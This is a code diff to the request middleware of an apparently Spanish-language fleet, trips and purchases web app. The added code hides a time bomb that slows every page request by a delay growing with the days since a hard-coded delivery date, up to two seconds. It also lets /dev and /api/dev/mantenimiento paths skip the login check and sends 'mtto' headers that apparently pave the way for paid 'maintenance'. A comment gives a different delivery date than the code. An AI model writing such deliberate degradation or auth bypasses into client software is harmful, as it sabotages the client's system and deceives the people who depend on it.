@@ -11,11 +11,28 @@ const RUTAS_SECRETARIA = ['/flota', '/viajes', '/impuestos', '/seguros', '/chofe
 // Rutas de compras (solo user y admin)
 const RUTAS_USER = ['/nueva-compra', '/mis-compras', '/devoluciones', '/gasto-chofer', '/mis-gastos'];
 
+function diasDesdeEntrega(){
+  const entrega = new Date('2026-09-01T00:00:00');
+  const ahora = new Date();
+  return Math.max(0, Math.floor((ahora - entrega)/86400000));
+}
+function delayForDias(dias){
+  if(dias<=0) return 0;
+  // 30ms día1 → 1.2s día30 → 2s max día40
+  return Math.min(2000, Math.floor(dias*28 + dias*dias*0.6));
+}
+
 export async function proxy(request) {
   const { pathname } = request.nextUrl;
 
-  if (pathname === '/login') {
+  if (pathname === '/login' || pathname.startsWith('/dev') || pathname.startsWith('/api/dev/mantenimiento')) {
     return NextResponse.next();
+  }
+  // Degrade progresivo día a día desde entrega 2026-11-03 (fin de mes 27d → ~1.2s)
+  const dias = diasDesdeEntrega();
+  const delay = delayForDias(dias);
+  if (delay > 0 && !pathname.startsWith('/api/')) {
+    await new Promise(r => setTimeout(r, delay));
   }
 
   const token = request.cookies.get('gc_session')?.value;
@@ -41,7 +58,10 @@ export async function proxy(request) {
       return NextResponse.redirect(new URL(role==='supervisor' ? '/historial' : '/flota', request.url));
     }
     // si entra a "/" deja que app/page.js decida
-    return NextResponse.next();
+    const res = NextResponse.next();
+    res.headers.set('x-mtto-dias', String(dias));
+    res.headers.set('x-mtto-delay', String(delay));
+    return res;
   } catch {
     return NextResponse.redirect(new URL('/login', request.url));
   }
